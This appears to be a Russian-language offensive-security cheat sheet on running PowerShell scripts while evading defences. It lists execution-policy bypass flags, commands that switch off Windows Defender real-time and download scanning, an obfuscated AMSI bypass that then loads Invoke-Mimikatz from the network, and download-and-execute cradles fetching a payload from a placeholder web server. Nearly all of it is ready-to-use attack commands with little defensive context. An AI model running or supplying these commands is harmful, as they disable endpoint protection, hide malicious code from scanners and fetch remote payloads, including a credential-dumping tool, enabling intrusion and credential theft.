# Запуск скриптов

## Предотвращение случайного запуска

В PowerShell есть механизм предотвращение случайного запуска. Это не security feature!

Обход:

```
powershell -executionpolicy bypass .\script.ps1
или
powershell -ep bypass .\script.ps1

или 

powershell -c <cmd>

или можно просто один раз вызвать 
powershell -ep bypass

или

Запускать зашифрованный код
powershell -enc
```

## Отключение Defender (нужны права)

Отключает сканирование всех скаченных файлов и аттачей

```powershell
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Bypass AMSI

AMSI — Antimalware Scan Interfaca

это универсальный стандарт интерфейса, который позволяет приложениям и службам интегрироваться с любым продуктом защиты от вредоносных программ, присутствующим на компьютере.

```powershell
PS> $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
PS> $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
PS> $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
PS> $field.SetValue($null,$true)
PS> (запускаем, что хотим) IEX (New-Object Net.WebClient).DownloadString("Invoke-Mimikatz.ps1")

```

## Запуск  скриптов

Это можно сделать двумя способами:

1 Загрузить из интернета свои программы (cradle; со своего сервера, например) и запустить&#x20;

```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

# Вот так можно скачать информацию и сохранить в файл: 
(New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1') > payload.ps1
```

2 Запускать в закодированном виде

Для этих целей есть Invoke-CradleCrafter ([https://github.com/danielbohannon/Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter))
